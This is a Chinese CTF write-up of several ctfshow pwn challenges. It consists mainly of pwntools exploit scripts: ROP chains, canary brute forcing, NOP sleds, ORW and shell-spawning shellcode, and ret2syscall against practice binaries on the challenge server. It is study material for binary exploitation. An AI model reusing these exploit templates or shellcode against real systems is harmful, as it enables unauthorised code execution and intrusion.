# ctfshow pwn题解（部分）

## read的系统调用号为0x3,execve的系统调用号为0xb

## 49 mprotect（32）

一个`mprotect`的题，主要是记一下模板

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
#gdb.attach(p)

mprotect  = elf.sym['mprotect']
addr = 0x80DA000
size = 0x1000
proc = 0x7
pop_ebx_esi_ebp_ret = 0x80a019b
read = elf.sym['read']

payload = b'a'*0x12+b'b'*0x4+p32(mprotect)
payload+=p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(size)+p32(proc)
payload+=p32(read)
payload+=p32(pop_ebx_esi_ebp_ret)+p32(0)+p32(addr)+p32(size)+p32(addr)

p.sendline(payload)
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```

## 52 函数传参（32）

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28294)
#gdb.attach(p)
flag = 0x8048586

payload = b'a'*0x6C+b'b'*0x4+p32(flag)+p32(0)+p32(876)+p32(877)

p.sendline(payload)
p.interactive()
```

## 53 32位canary爆破

```python
from pwn import *
context.log_level = 'critical'
canary = b''
for i in range(4):
    for c in range(0xFF):
        #io = process('./pwn')
        io = remote('pwn.challenge.ctf.show',28248)
        io.sendlineafter('>',b'-1')
        payload = b'a'*0x20 + canary + p8(c)
        io.sendafter('$ ',payload)
        io.recv(1)
        ans = io.recv()
        print (ans)
        if b'Canary Value Incorrect!' not in ans:
            print ('The index({}),value({})'.format(i,c))
            canary += p8(c)
            break
        else:
            print ('tring... ...')
        io.close()

#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28248)
elf = ELF('./pwn')
flag = elf.sym['flag']
payload = b'a'*0x20 + canary + p32(0)*4 + p32(flag)
io.sendlineafter('>',b'-1')
io.sendafter('$ ',payload)
io.interactive()
```

## 54 puts遇见'\x00'截断，可以填充满导致后续内容溢出

```python
from pwn import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
p = remote('pwn.challenge.ctf.show',28241)
p.sendlineafter(b'Username:\n',b'a'*256)
p.recvuntil(b'aa,')
password = p.recv(33)
p.close()
p = remote('pwn.challenge.ctf.show',28241)
p.sendline('amdin')
p.sendlineafter(b'.\n',password)
p.interactive()
```

## 61 leave_ret指令会对shellcode产生影响，注意输入的后面是否有该指令

#### 有PIE，栈可执行，有RWX

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/61/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p =remote('pwn.challenge.ctf.show',28273)
#gdb.attach(p)

p.recvuntil(b'[')
v5 = int(p.recvuntil(b']',drop=True),16)
shellcode = asm(shellcraft.sh())
payload = b'a'*0x10+b'b'*0x8+p64(v5+0x20)+shellcode
p.sendline(payload)
p.sendline(b'cat ctfshow_flag')
p.interactive()
```

## 66 \x00绕过字符串

```python
from pwn import *
context(os = 'linux',arch = 'amd64')
p = process('./pwn')
payload = b'\x00\xc0'+asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
```

## 68 nop sled(64bit)

#### 有Canary，无PIE，栈可执行，有RWX,绕过随机数生成的缓冲区位置

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/68/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show', 28182)
#gdb.attach(p)

shellcode = asm(shellcraft.sh())
payload = b'\x90'*1336 + shellcode

p.recvuntil(": 0x")
addr = u64(unhex(p.recvline(keepends=False).zfill(16)),endian='big')
log.info("addr:"+hex(addr))
p.recvuntil(b"> ")
p.sendline(payload)
p.recvuntil(b"> ")
sh = addr + 668 + 0x35
log.info("send:"+hex(sh))
p.sendline(hex(sh))

p.interactive()
```

## 69 ORW的板子

#### 无Canary，无PIE，有RWX，栈可执行

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/69/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
```

```python
from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28170)
mmap = 0x123000
jmp_rsp = 0x400a01
orw_shellcode = shellcraft.open("/ctfshow_flag") # 打开根目录下的ctfshow_flag文件
orw_shellcode += shellcraft.read(3,mmap,100) # 读取文件标识符是3的文件0x100个字节存放到mmap分配的地址空间里
orw_shellcode += shellcraft.write(1,mmap,100) # 将mmap地址上的内容输出0x100个字节
shellcode = asm(orw_shellcode)
## read里的fd写3是因为程序执行的时候文件描述符是从3开始的，write里的1是标准输出到显示器
payload = asm(shellcraft.read(0,mmap,0x100))+asm("mov rax,0x123000; jmp rax")
# buf里的rop是往mmap里读入0x100长度的数据，跳转到mmap的地址执行
payload = payload.ljust(0x28,'a') # buf的大小是0x20，加上rbp 0x8是0x28，用'\x00'去填充剩下的位置
payload += p64(jmp_rsp)+asm("sub rsp,0x30; jmp rsp") # 返回地址写上跳转到rsp
io.recvuntil('do')
io.sendline(payload)
io.sendline(shellcode)
io.interactive()
```

## 70 ORW的汇编板子

#### 有Canary，无PIE，栈可执行，有RWX，沙盒保护

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/70/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

```python
#coding:utf-8
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28156)
#gdb.attach(p)

shellcode = '''
push 0

mov r15, 0x67616c66	//flag的ascll码形式
push r15
mov rdi, rsp
mov rsi, 0
mov rax, 2
syscall		//open("flag",rsp,0)

mov r14, 3
mov rdi, r14
mov rsi, rsp
mov rdx, 0xff
mov rax, 0
syscall		//read(3,rsp,0xff)

mov rdi, 1
mov rsi, rsp
mov rdx, 0xff
mov rax, 1
syscall		//write(1.rsp,oxff)
'''
payload = asm(shellcode)
p.sendline(payload)
p.interactive()
```

## 71 ret2syscall(32bit)板子

#### NX开启，无PIE

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/71/pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28304)
#gdb.attach(p)

binsh = 0x80BE408	//能找到binsh
int_0x80 = 0x08049421
pop_eax = 0x080bb196	//控制int 0x80
pop_edx_ecx_ebx = 0x0806eb90	//传3个参数
payload = b'a'*0x6C+b'b'*0x4
payload+=p32(pop_eax)+p32(0xb)	//0xb是execve
payload+=p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(binsh)	//execve(0,0,"/bin/sh")
payload+=p32(int_0x80)
p.sendline(payload)
p.interactive()
```

## 72 ret2syscall(32bit,无/bin/sh)板子

#### NX保护开启，无PIE

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/72/pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28258)
#gdb.attach(p)

pop_eax = 0x080bb2c6
payload = b'a'*0x28+b'b'*0x4
int_0x80 = 0x0806f350
#------read-----
pop_edx_ecx_ebx = 0x0806ecb0
bss = 0x80EB000
payload+=p32(pop_eax)+p32(0x3)
payload+=p32(pop_edx_ecx_ebx)+p32(0x10)+p32(bss)+p32(0)
payload+=p32(int_0x80)
#------syscall-------
payload+=p32(pop_eax)+p32(0xb)
payload+=p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bss)
payload+=p32(int_0x80)
p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()
```

